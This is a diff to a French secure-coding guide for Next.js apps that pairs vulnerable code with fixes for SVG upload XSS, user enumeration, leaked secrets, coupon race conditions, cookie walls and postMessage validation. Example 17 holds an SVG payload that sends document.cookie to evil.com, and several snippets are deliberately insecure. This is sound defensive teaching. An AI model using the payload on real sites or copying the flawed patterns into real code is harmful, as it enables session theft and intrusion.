@@ -1027,3 +1027,514 @@ export default function robots(): MetadataRoute.Robots {
 **Explication :** Le footer en `/#mentions-legales` est un anti-pattern : pas de page dédiée, contenu non deep-linkable, non indexable par les moteurs. L'absence des pages légales du sitemap les rend invisibles pour Google. La divergence footer (`/mentions-legales`) vs sitemap (`/legal`) crée du duplicate content. Correction : triplet cohérent (page physique + footer + sitemap) avec URLs identiques et canonical stable.
 
 **Référence :** `gdpr.md` §9 — Navigation légale cohérente ; Loi pour une République Numérique
+
+---
+
+## EXEMPLE 17 — Upload de SVG avec XSS
+
+### ❌ Bug détecté
+
+```typescript
+// app/api/upload/route.ts
+export async function POST(request: Request) {
+  const formData = await request.formData();
+  const file = formData.get('file') as File;
+  
+  // Validation basique sur Content-Type (contournable)
+  if (!file.type.startsWith('image/')) {
+    return Response.json({ error: 'Type invalide' }, { status: 400 });
+  }
+  
+  const filename = file.name; // ⚠️ path traversal possible
+  const buffer = Buffer.from(await file.arrayBuffer());
+  await fs.writeFile(`./public/uploads/${filename}`, buffer);
+  
+  return Response.json({ url: `/uploads/${filename}` });
+}
+```
+
+Un attaquant upload `evil.svg` :
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com/?c='+document.cookie)">
+  <script>alert(document.cookie)</script>
+</svg>
+```
+
+Quand un admin ouvre l'URL `/uploads/evil.svg`, le script s'exécute dans son navigateur → vol du cookie admin (même `HttpOnly` ne protège pas, le script peut faire d'autres actions).
+
+### ✅ Correction automatique
+
+```typescript
+// app/api/upload/route.ts
+import sharp from 'sharp';
+import { randomUUID } from 'crypto';
+import path from 'path';
+import { detectRealMimeType } from '@/lib/file-validation';
+import { s3 } from '@/lib/s3';
+import { PutObjectCommand } from '@aws-sdk/client-s3';
+
+const ALLOWED_MIME = ['image/jpeg', 'image/png', 'image/webp'];
+const MAX_SIZE = 5 * 1024 * 1024;
+const ALLOWED_EXT = ['.jpg', '.jpeg', '.png', '.webp'];
+
+export async function POST(request: Request) {
+  const formData = await request.formData();
+  const file = formData.get('file') as File;
+  
+  if (!file) return Response.json({ error: 'Fichier manquant' }, { status: 400 });
+  if (file.size > MAX_SIZE) {
+    return Response.json({ error: 'Trop volumineux (max 5 Mo)' }, { status: 413 });
+  }
+  
+  // Vérifier extension
+  const ext = path.extname(file.name).toLowerCase();
+  if (!ALLOWED_EXT.includes(ext)) {
+    return Response.json({ error: 'Extension non autorisée' }, { status: 400 });
+  }
+  
+  // 1. Magic bytes — pas confiance au Content-Type
+  const buffer = Buffer.from(await file.arrayBuffer());
+  const realMime = detectRealMimeType(buffer);
+  if (!realMime || !ALLOWED_MIME.includes(realMime)) {
+    return Response.json({ error: 'Format non supporté' }, { status: 400 });
+  }
+  
+  // 2. Rejeter SVG explicitement (même si renommé en .jpg)
+  if (buffer.slice(0, 4).toString('utf-8') === '<svg' || 
+      buffer.slice(0, 5).toString('utf-8') === '<?xml') {
+    return Response.json({ error: 'SVG interdit' }, { status: 400 });
+  }
+  
+  // 3. Re-encoder avec sharp — strip EXIF + redimensionner
+  const processed = await sharp(buffer)
+    .resize(1920, 1920, { fit: 'inside', withoutEnlargement: true })
+    .jpeg({ quality: 85 })
+    .toBuffer();
+  
+  // 4. Nom UUID — pas confiance au filename utilisateur
+  const filename = `${randomUUID()}.jpg`;
+  
+  // 5. Stockage bucket PRIVÉ (pas public/)
+  await s3.send(new PutObjectCommand({
+    Bucket: process.env.S3_BUCKET!,
+    Key: `uploads/${filename}`,
+    Body: processed,
+    ContentType: 'image/jpeg',
+    ServerSideEncryption: 'AES256',
+  }));
+  
+  // 6. URL via route API qui vérifie l'auth
+  return Response.json({ 
+    url: `/api/files/${filename}`,
+    filename,
+  });
+}
+```
+
+**Explications :**
+1. `file.type` est envoyé par le client, contournable → magic bytes
+2. `file.name` pouvait contenir `../../etc/passwd` → UUID + extension whitelistée
+3. SVG interdit (XSS possible via `<script>` ou `onload`)
+4. `sharp` re-encode l'image → EXIF GPS supprimé
+5. Bucket S3 privé + route API pour servir avec auth, pas `public/`
+
+**Référence :** `advanced.md` §1 — File upload security
+
+---
+
+## EXEMPLE 18 — Énumération d'utilisateurs via inscription
+
+### ❌ Bug détecté
+
+```typescript
+// app/api/auth/register/route.ts
+export async function POST(request: Request) {
+  const { email } = await request.json();
+  
+  const existing = await db.user.findUnique({ where: { email } });
+  if (existing) {
+    // ⚠️ Révèle que l'email existe
+    return Response.json({ error: 'Cet email est déjà inscrit' }, { status: 409 });
+  }
+  
+  await createUser(email);
+  return Response.json({ success: true });
+}
+```
+
+Un attaquant peut tester 10000 emails et obtenir la liste de tous les inscrits (attaque d'énumération, préparation à du phishing ciblé).
+
+### ✅ Correction automatique
+
+```typescript
+// app/api/auth/register/route.ts
+export async function POST(request: Request) {
+  const { email } = RegisterSchema.parse(await request.json());
+  
+  const existing = await db.user.findUnique({ where: { email } });
+  
+  if (existing) {
+    // Email de "déjà inscrit" — pas d'info sur l'existence
+    await sendEmail(email, 'register-attempt', { 
+      message: 'Quelqu\'un a tenté de s\'inscrire avec votre email. Si c\'est vous, connectez-vous.' 
+    });
+  } else {
+    // Cas nominal : créer et envoyer lien de confirmation
+    const user = await createUser(email);
+    await sendConfirmationEmail(user);
+  }
+  
+  // Même réponse dans les 2 cas
+  return Response.json({
+    success: true,
+    message: 'Si cet email n\'est pas déjà inscrit, un lien de confirmation a été envoyé.'
+  });
+}
+```
+
+Appliquer le même pattern sur : `forgot-password`, `login` (sur certains types d'erreurs), `verify-email`.
+
+**Référence :** `advanced.md` §15 — Information disclosure
+
+---
+
+## EXEMPLE 19 — Secret leaked dans NEXT_PUBLIC_
+
+### ❌ Bug détecté
+
+```bash
+# .env.local
+NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_51ABC...
+NEXT_PUBLIC_SUPABASE_URL=https://xxx.supabase.co
+NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOi...  # ⚠️ anon key OK
+NEXT_PUBLIC_SUPABASE_SERVICE_KEY=eyJhbGciOi... # ⚠️ service_role = SECRET
+```
+
+```typescript
+// lib/stripe.ts (côté serveur, mais importé dans un composant client)
+import Stripe from 'stripe';
+export const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY!);
+```
+
+Le secret Stripe se retrouve inline dans le bundle JS téléchargé par tous les visiteurs. N'importe qui peut le récupérer via DevTools → Network → n'importe quel chunk JS.
+
+### ✅ Correction automatique
+
+1. **Renommer** la variable (retrait du `NEXT_PUBLIC_`) :
+
+```bash
+# .env.local
+STRIPE_SECRET_KEY=sk_live_51ABC...
+SUPABASE_SERVICE_KEY=eyJhbGciOi...  # ⚠️ usage serveur uniquement
+NEXT_PUBLIC_SUPABASE_URL=https://xxx.supabase.co
+NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOi...  # OK public
+```
+
+2. **Révoquer** immédiatement le secret Stripe live (compromis), en générer un nouveau.
+
+3. **Isoler** l'usage serveur du client :
+
+```typescript
+// lib/stripe.server.ts (jamais importé côté client)
+import Stripe from 'stripe';
+export const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
+```
+
+```typescript
+// components/checkout.tsx (client)
+'use client';
+// Utiliser la publishable key (pk_live_*) côté client
+const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);
+```
+
+4. **Vérifier après build** :
+
+```bash
+npm run build
+grep -rE "(sk_live_|sk_test_|service_role|service_key|password|jwt_secret)" .next/static/chunks/
+# Doit retourner vide
+```
+
+**Référence :** `advanced.md` §20 — NEXT_PUBLIC_ leak
+
+---
+
+## EXEMPLE 20 — Race condition sur coupon
+
+### ❌ Bug détecté
+
+```typescript
+// app/api/coupon/apply/route.ts
+export async function POST(request: Request) {
+  const { code, cartId } = await request.json();
+  
+  const coupon = await db.coupon.findUnique({ where: { code } });
+  if (!coupon) return Response.json({ error: 'Invalide' }, { status: 400 });
+  
+  // Check
+  if (coupon.usedCount >= coupon.maxUses) {
+    return Response.json({ error: 'Épuisé' }, { status: 400 });
+  }
+  
+  // Update — non atomique
+  await db.coupon.update({
+    where: { id: coupon.id },
+    data: { usedCount: { increment: 1 } },
+  });
+  
+  return Response.json({ success: true, discount: coupon.discount });
+}
+```
+
+Un attaquant envoie 10 requêtes simultanées avec le même coupon limité à 1 usage. Toutes passent le `check` (usedCount=0 < maxUses=1), puis toutes incrémentent → 10 utilisations au lieu de 1.
+
+### ✅ Correction automatique
+
+```typescript
+// app/api/coupon/apply/route.ts
+export async function POST(request: Request) {
+  const { code, cartId } = ApplyCouponSchema.parse(await request.json());
+  
+  // 1. UPDATE atomique avec condition WHERE
+  const result = await db.coupon.updateMany({
+    where: {
+      code,
+      usedCount: { lt: db.coupon.fields.maxUses }, // ✅ check atomique
+      isActive: true,
+      expiresAt: { gt: new Date() },
+    },
+    data: { usedCount: { increment: 1 } },
+  });
+  
+  if (result.count === 0) {
+    return Response.json({ error: 'Coupon invalide, expiré ou épuisé' }, { status: 400 });
+  }
+  
+  // 2. Empêcher la double-application au même panier (contrainte unique)
+  try {
+    await db.cartCoupon.create({
+      data: { cartId, couponCode: code },
+    });
+  } catch (err) {
+    // Unique violation — déjà appliqué à ce panier
+    if (err.code === 'P2002') {
+      // Rollback l'incrémentation
+      await db.coupon.update({
+        where: { code },
+        data: { usedCount: { decrement: 1 } },
+      });
+      return Response.json({ error: 'Coupon déjà appliqué à ce panier' }, { status: 409 });
+    }
+    throw err;
+  }
+  
+  const coupon = await db.coupon.findUnique({ where: { code } });
+  return Response.json({ success: true, discount: coupon!.discount });
+}
+```
+
+**Explication :** Le pattern `updateMany` avec condition dans `where` fait un seul round-trip DB atomique. Si 10 requêtes arrivent en parallèle, une seule réussit (la DB garantit l'atomicité au niveau ligne). La contrainte unique `cartCoupon(cartId, couponCode)` empêche aussi la double-application au même panier.
+
+**Référence :** `advanced.md` §4 — Race conditions
+
+---
+
+## EXEMPLE 21 — Cookie wall RGPD
+
+### ❌ Bug détecté
+
+```tsx
+// app/layout.tsx
+export default function RootLayout({ children }) {
+  const consent = getConsent();
+  
+  // ⚠️ Cookie wall : bloque TOUT le contenu
+  if (!consent) {
+    return (
+      <html>
+        <body>
+          <CookieWall />
+        </body>
+      </html>
+    );
+  }
+  
+  return (
+    <html>
+      <body>
+        {children}
+      </body>
+    </html>
+  );
+}
+```
+
+L'utilisateur ne peut pas consulter les articles sans accepter les cookies → **interdit par la CNIL** (jurisprudence Planet49, Tribunal UE 2019).
+
+### ✅ Correction automatique
+
+```tsx
+// app/layout.tsx
+export default function RootLayout({ children }) {
+  return (
+    <html>
+      <body>
+        {/* Contenu accessible immédiatement */}
+        {children}
+        
+        {/* Bannière en overlay — ne bloque pas */}
+        <CookieBanner />
+      </body>
+    </html>
+  );
+}
+
+// components/cookie-banner.tsx
+'use client';
+export function CookieBanner() {
+  const [visible, setVisible] = useState(false);
+  
+  useEffect(() => {
+    const consent = getConsent();
+    if (!consent) setVisible(true);
+  }, []);
+  
+  if (!visible) return null;
+  
+  return (
+    <div 
+      role="dialog" 
+      aria-label="Consentement cookies"
+      style={{
+        position: 'fixed',
+        bottom: 0,
+        left: 0,
+        right: 0,
+        zIndex: 1000,
+        background: 'white',
+        borderTop: '1px solid #ccc',
+        padding: '1rem',
+      }}
+    >
+      <p>Nous utilisons des cookies pour [...]</p>
+      <div>
+        <button onClick={() => acceptAll()}>Tout accepter</button>
+        <button onClick={() => refuseAll()}>Refuser les non essentiels</button>
+        <a href="/cookies">Personnaliser</a>
+      </div>
+    </div>
+  );
+}
+```
+
+**Explication :** Le contenu doit être accessible immédiatement au chargement. La bannière apparaît en superposition (overlay) mais ne bloque pas la lecture. L'utilisateur peut consulter, scroller, lire les articles même en refusant les cookies.
+
+**Référence :** `gdpr.md` §15 — Cookie wall interdit
+
+---
+
+## EXEMPLE 22 — postMessage sans validation d'origine
+
+### ❌ Bug détecté
+
+```tsx
+// components/payment-widget.tsx
+'use client';
+import { useEffect } from 'react';
+
+export function PaymentWidget() {
+  useEffect(() => {
+    window.addEventListener('message', (event) => {
+      // ⚠️ Pas de validation d'origin
+      if (event.data.type === 'payment-success') {
+        // ⚠️ Modification du state critique sans vérification
+        window.location.href = event.data.redirectUrl; // open redirect
+      }
+      
+      if (event.data.type === 'set-token') {
+        localStorage.setItem('token', event.data.token); // vol de session
+      }
+    });
+  }, []);
+  
+  return <iframe src="https://payment-provider.com" />;
+}
+```
+
+N'importe quelle page ouverte dans le navigateur (popup, autre onglet, iframe malveillante) peut envoyer un `postMessage` à cette fenêtre et déclencher la redirection ou injecter un token.
+
+### ✅ Correction automatique
+
+```tsx
+// components/payment-widget.tsx
+'use client';
+import { useEffect } from 'react';
+import { z } from 'zod';
+
+const ALLOWED_ORIGINS = [
+  'https://payment-provider.com',
+];
+
+const MessageSchema = z.discriminatedUnion('type', [
+  z.object({
+    type: z.literal('payment-success'),
+    redirectUrl: z.string().url().refine(url => {
+      // Autoriser uniquement URLs relatives ou même domaine
+      try {
+        const parsed = new URL(url, window.location.origin);
+        return parsed.origin === window.location.origin;
+      } catch {
+        return false;
+      }
+    }, 'URL doit être relative'),
+  }),
+  z.object({
+    type: z.literal('payment-error'),
+    message: z.string().max(500),
+  }),
+]);
+
+export function PaymentWidget() {
+  useEffect(() => {
+    const handler = (event: MessageEvent) => {
+      // 1. Valider l'origine
+      if (!ALLOWED_ORIGINS.includes(event.origin)) {
+        console.warn('postMessage from unauthorized origin:', event.origin);
+        return;
+      }
+      
+      // 2. Valider la structure avec Zod
+      const parsed = MessageSchema.safeParse(event.data);
+      if (!parsed.success) {
+        console.warn('Invalid postMessage format:', parsed.error);
+        return;
+      }
+      
+      // 3. Action selon type validé
+      const message = parsed.data;
+      if (message.type === 'payment-success') {
+        window.location.href = message.redirectUrl;
+      }
+    };
+    
+    window.addEventListener('message', handler);
+    return () => window.removeEventListener('message', handler);
+  }, []);
+  
+  return <iframe src="https://payment-provider.com/embed" sandbox="allow-scripts allow-same-origin" />;
+}
+
+// Côté envoi — toujours préciser targetOrigin (jamais '*')
+function sendMessageToIframe(iframe: HTMLIFrameElement, message: unknown) {
+  iframe.contentWindow?.postMessage(
+    message,
+    'https://payment-provider.com' // ✅ pas '*'
+  );
+}
+```
+
+**Explication :** Sans validation d'origin, n'importe quelle fenêtre peut envoyer un message. Le pattern corrigé valide 3 choses : (1) l'expéditeur est dans la whitelist des origins, (2) la structure du message est exactement celle attendue (Zod discriminated union), (3) l'URL de redirection est validée comme étant relative ou même domaine.
+
+**Référence :** `frontend.md` §11 — postMessage ; `advanced.md` §10
